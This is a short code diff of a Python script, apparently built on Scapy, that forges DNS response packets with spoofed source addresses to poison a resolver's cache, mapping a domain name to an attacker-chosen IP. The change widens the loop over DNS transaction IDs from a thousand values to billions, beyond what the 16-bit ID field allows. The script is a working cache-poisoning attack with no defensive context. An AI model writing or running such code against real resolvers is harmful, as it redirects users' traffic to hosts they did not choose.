@@ -13,7 +13,7 @@ import time
 url = "boe.gov.er"
 SPOOF_ADDR = '217.127.199.128'
 pkts = []
-for x in range (10000,11000):
+for x in range (1,9999999999):
         pkt = Ether()/IP(dst="196.200.96.1",src="196.200.104.106")/UDP(dport=4250)/DNS(id=x,an=DNSRR(rrname=url, type='A', rclass='IN', ttl=350, rdata=SPOOF_ADDR))
         pkts.append(pkt)
 dns = Ether()/IP(dst="217.127.199.128",src="196.200.104.42")/UDP()/DNS(qd=DNSQR(qname=url))
